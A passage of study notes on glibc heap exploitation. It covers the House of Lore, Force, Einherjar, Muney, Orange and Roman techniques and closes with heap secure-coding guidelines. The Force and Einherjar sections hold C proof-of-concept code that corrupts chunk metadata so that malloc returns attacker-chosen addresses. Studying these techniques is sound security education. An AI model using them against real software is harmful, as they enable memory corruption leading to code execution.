// Next malloc for that size will return the fake chunk
victim = malloc(len); // points at address 0x7ffdeb37d060
```

- Notice that the steps needed for forging a small chunk are more due to the complicated handling of small chunks. 
	- Particular care was needed to ensure that `victim->bk->fd` equals `victim` for every small chunk that is to be returned from 'malloc', to pass the "malloc(): smallbin double linked list corrupted" security check.
		- Also, extra 'malloc' calls were added in between to ensure that:

-   1.  The first chunk goes to the unsorted bin instead of merging with the top chunk on freeing.
-   2.  The first chunk goes to the small bin as it does not satisfy a malloc request for `len + 0x10`.

The state of the unsorted bin and the small bin are shown:

-   1. free(ptr). Unsorted bin:
    -  head <-> ptr <-> tail
    Small bin:
    -  head <-> tail

-   2. malloc(len + 0x10); Unsorted bin:
    -  head <-> tail
    Small bin:
    -  head <-> ptr <-> tail

-   3. Pointer manipulations Unsorted bin:
    -  head <-> tail
    Small bin:
    -  undefined <-> fake_chunk <-> ptr <-> tail

-   4. malloc(len) Unsorted bin:
    -  head <-> tail
    Small bin:
    -  undefined <-> fake_chunk <-> tail
    

-   5. malloc(len) Unsorted bin:
    -  head <-> tail
    Small bin:
    -  undefined <-> tail [ Fake chunk is returned ]
    

- Note that another 'malloc' call for the corresponding small bin will result in a segmentation fault.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### House Of Force

- Similar to 'House of Lore', this attack focuses on returning an arbitrary pointer from 'malloc'. Forging chunks attack was discussed for fastbins and the 'House of Lore' attack was discussed for small bins.
	- The 'House of Force' exploits the 'top chunk'. The topmost chunk is also known as the 'wilderness'. It borders the end of the heap (i.e. it is at the maximum address within the heap) and is not present in any bin.
		- It follows the same format of the chunk structure.

- This attack assumes an overflow into the top chunk's header. The `size` is modified to a very large value (`-1` in this example). This ensures that all initial requests will be services using the top chunk, instead of relying on `mmap`.
	- On a 64 bit system, `-1` evaluates to `0xFFFFFFFFFFFFFFFF`. A chunk with this size can cover the entire memory space of the program. Let us assume that the attacker wishes 'malloc' to return address `P`. Now, any malloc call with the size of: `&top_chunk` - `P` will be serviced using the top chunk.
		- Note that `P` can be after or before the `top_chunk`. If it is before, the result will be a large positive value (because size is unsigned). 
			- It will still be less than `-1`. An integer overflow will occur and malloc will successfully service this request using the top chunk. 
				- Now, the top chunk will point to `P` and any future requests will return `P`!

```c
// Attacker will force malloc to return this pointer
char victim[] = "This is victim's string that will returned by malloc"; // At 0x601060

struct chunk_structure {
	size_t prev_size;
	size_t size;
	struct chunk_structure *fd;
	struct chunk_structure *bk;
	char buf[10]; // padding
	};

struct chunk_structure *chunk, *top_chunk;
unsigned long long *ptr;
size_t requestSize, allotedSize;

// First, request a chunk, so that we can get a pointer to top chunk
ptr = malloc(256); // At 0x131a010

chunk = (struct chunk_structure *)(ptr - 2); // At 0x131a000

// lower three bits of chunk->size are flags
allotedSize = chunk->size & ~(0x1 | 0x2 | 0x4);

// top chunk will be just next to 'ptr'
top_chunk = (struct chunk_structure *)((char *)chunk + allotedSize); // At 0x131a110

// here, attacker will overflow the 'size' parameter of top chunk
top_chunk->size = -1; // Maximum size

// Might result in an integer overflow, doesn't matter
requestSize = (size_t)victim // The target address that malloc should return
	- (size_t)top_chunk // The present address of the top chunk
	- 2*sizeof(long long) // Size of 'size' and 'prev_size'
	- sizeof(long long); // Additional buffer

// This also needs to be forced by the attacker
// This will advance the top_chunk ahead by (requestSize+header+additional buffer)
// Making it point to 'victim'
malloc(requestSize); // At 0x131a120

// The top chunk again will service the request and return 'victim'
ptr = malloc(100); // At 0x601060 !! (Same as 'victim')
```

- `malloc` returned an address pointing to `victim`.

- Note the following things that we need to take care:

	- 1. While deducing the exact pointer to `top_chunk`, 0 out the three lower bits of the previous chunk to obtain correct size.

	- 2. While calculating requestSize, an additional buffer of around `8` bytes was reduced. This was just to counter the rounding up malloc does while servicing chunks. Incidentally, in this case, malloc returns a chunk with `8` additional bytes than requested. Notice that this is machine dependent.

	- 3. `victim` can be any address (on heap, stack, bss, etc.).

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### House Of Einherjar

- This house is not part of "The Malloc Maleficarum". This heap exploitation technique was given by [Hiroki Matsukuma](https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606) in 2016.
	- This attack also revolves around making 'malloc' return a nearly arbitrary pointer. Unlike other attacks, this requires just a single byte of overflow. 
		- There exists much more software vulnerable to a single byte of overflow mainly due to the famous ["off by one"](https://en.wikipedia.org/wiki/Off-by-one_error) error. It overwrites into the 'size' of the next chunk in memory and clears the `PREV_IN_USE` flag to 0. 
			- Also, it overwrites into `prev_size` (already in the previous chunk's data region) a fake size. When the next chunk is freed, it finds the previous chunk to be free and tries to consolidate by going back 'fake size' in memory. 
				- This fake size is so calculated so that the consolidated chunk ends up at a fake chunk, which will be returned by subsequent malloc.

```c
struct chunk_structure {
  size_t prev_size;
  size_t size;
  struct chunk_structure *fd;
  struct chunk_structure *bk;
  char buf[32];               // padding
};

struct chunk_structure *chunk1, fake_chunk;     // fake chunk is at 0x7ffee6b64e90
size_t allotedSize;
unsigned long long *ptr1, *ptr2;
char *ptr;
void *victim;

// Allocate any chunk
// The attacker will overflow 1 byte through this chunk into the next one
ptr1 = malloc(40);                              // at 0x1dbb010

// Allocate another chunk
ptr2 = malloc(0xf8);                            // at 0x1dbb040

chunk1 = (struct chunk_structure *)(ptr1 - 2);
allotedSize = chunk1->size & ~(0x1 | 0x2 | 0x4);
allotedSize -= sizeof(size_t);      // Heap meta data for 'prev_size' of chunk1

// Attacker initiates a heap overflow
// Off by one overflow of ptr1, overflows into ptr2's 'size'
ptr = (char *)ptr1;
ptr[allotedSize] = 0;      // Zeroes out the PREV_IN_USE bit

// Fake chunk
fake_chunk.size = 0x100;   // enough size to service the malloc request
// These two will ensure that unlink security checks pass
// i.e. P->fd->bk == P and P->bk->fd == P
fake_chunk.fd = &fake_chunk;
fake_chunk.bk = &fake_chunk;

// Overwrite ptr2's prev_size so that ptr2's chunk - prev_size points to our fake chunk
// This falls within the bounds of ptr1's chunk - no need to overflow
*(size_t *)&ptr[allotedSize-sizeof(size_t)] =
                                (size_t)&ptr[allotedSize - sizeof(size_t)]  // ptr2's chunk
                                - (size_t)&fake_chunk;

// Free the second chunk. It will detect the previous chunk in memory as free and try
// to merge with it. Now, top chunk will point to fake_chunk
free(ptr2);

victim = malloc(40);                  // Returns address 0x7ffee6b64ea0 !!
```

- Note the following:

	- 1. The second chunk's size was given as `0xf8`. This simply ensured that the actual chunk's size has the least significant byte as `0` (ignoring the flag bits). 
		- Hence, it was a simple matter to set the previous in use bit to `0` without changing the size of this chunk.

	-   2. The `allotedSize` was further decreased by `sizeof(size_t)`. `allotedSize` is equal to the size of the complete chunk. However, the size allowed for data is `sizeof(size_t)` less, or the equivalent of the `size` parameter in the heap. 
		- This is because `size` and `prev_size` of the current chunk cannot be used, but the `prev_size` of the next chunk can be used.
    

-   3. Fake chunk's forward and backward pointers were adjusted to pass the security check in `unlink`.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### House Of Muney
- https://github.com/mdulin2/house-of-muney
- https://maxwelldulin.com/BlogPost?post=6967456768

- Exploiting different heap libraries tends to be difficult, complex and requires a deep knowledge of the library itself. Recently, Qualys decided to go back and exploit a 15 year bug in QMail that was thought to unexploitable with some incredible techniques.
	- [This exploit](https://www.qualys.com/2020/05/19/cve-2005-1513/remote-code-execution-qmail.txt) uses a very interesting quirk of Malloc and exploit method that had not been seen before, which I have decided to name the **House of Muney**.

- In this article, I wanted to shed more light on the exploitation method that was used by the Qualys researchers to ensure there is a well-documented location for this exploit method. 
	-  In short, it is broken up into _Munmap_ing part of LibC and to rewrite_ the symbol table to get code execution.
		-  There are two main perks of this technique: this **bypasses ASLR** entirely and works on **mmap** chunks in GLibC Malloc.

##### Munmap Madness

- With the funky handling of mmap chunks in GLibC, it was bound that somebody had done research on this in the past. In a very well-done article by Tukan titled [Munmap Madness](http://tukan.farm/2016/07/27/munmap-madness/), the author dives into the possibilities of what can happen with corrupted mmap Malloc chunks.
	- In this article, the author discusses how mmap chunks work, potential exploits and weird quirks about it. For more information on mmap chunks, please refer to his [article](http://tukan.farm/2016/07/27/munmap-madness/).

- What we are taking from the the _Munmap Madness_ article, is that the author mentions _altering the size_ of an Mmap chunk to trigger the removal (munmap) of a section of memory. 
	- The main interests are the other parts of a program, such as a thread stack, LibC and so on. Although altering LibC may be difficult, the focus of this article will be on _munmapping_ a small section of LibC in order to take control of the program later.

##### The plan for exploitation is as follows:

- 1.  Overwrite mmap chunk _size_ or _prev_size_.
- 2.  Free the mmap chunk (with munmap) to override part of the memory mapping of LibC (`.gnu.hash, .dynsym`)
- 3.  Get mmap chunk over the top of LibC region.
- 4.  Rewrite `.gnu.hash` and `.dynsym` sections of LibC ELF.
- 5.  Call previously uncalled function for code execution.


+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### House Of Orange
- https://1ce0ear.github.io/2017/11/26/study-house-of-orange <- I really suggest checking this out

- The core idea of house of orange is the unsorted bin attack & fsp attack.
	- To get a unsorted bin, house of orange overwrites the size of top chunk and trigger _int_free inside the sysmalloc function.

- However the house of orange is arcane. Many blogs / articles contradicts each other because the whole exploitation process is fiendishly complicated.

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

#### House Of Roman
- https://gist.github.com/romanking98/9aab2804832c0fb46615f025e8ffb0bc
- https://media.defcon.org/DEF%20CON%2026/DEF%20CON%2026%20presentations/Sanat%20Sharma/DEFCON-26-Sanat-Sharma-House-of-Roman-Updated.pdf
- https://www.youtube.com/watch?v=bFHvcAWlfNA

- ^---- leaving lots of great sources

- Regarding ptmalloc2, many heap exploitation techniques have been invented in the recent years, well documented on the famous how2heap repository, or as writeups of famous CTF challenges (like House of Orange). 
	- However, most of them require atleast a libc/heap leak , or fail in non-PIE binaries. House of Roman `leverages a single bug to gain shell leaklessly` on a PIE enabled Binary.

- Features of house of roman:
	- leakless
	- uses 4 part partial overwrite to achieve complete RCE
	- the server does not need to print any data back to us
	- can be preformed using simple `off-by-one` bugs into powerful `Use-After-Free`
	- can also beat calloc()

---

## Some Secure Coding Guidelines For The Heap!

-   1. Use only the amount of memory asked using malloc. Make sure not to cross either boundary.
-   2. Free only the memory that was dynamically allocated exactly once.
-   3. Never access freed memory.
-   4. Always check the return value of malloc for `NULL`.

- The above-mentioned guidelines are to be followed _strictly_. Below are some additional guidelines that will help to further prevent attacks:

	-  5. After every free, re-assign each pointer pointing to the recently freed memory to `NULL`.
	-  4. Always release allocated storage in error handlers.
	-  6. Zero out sensitive data before freeing it using `memset_s` or a similar method that cannot be optimised out by the compiler.
	-  7. Do not make any assumption regarding the positioning of the returned addresses from malloc.

- Also Checkout Glibc Security Implementation To Prevent Heap Related Attacks
	- https://heap-exploitation.dhavalkapil.com/diving_into_glibc_heap/security_checks
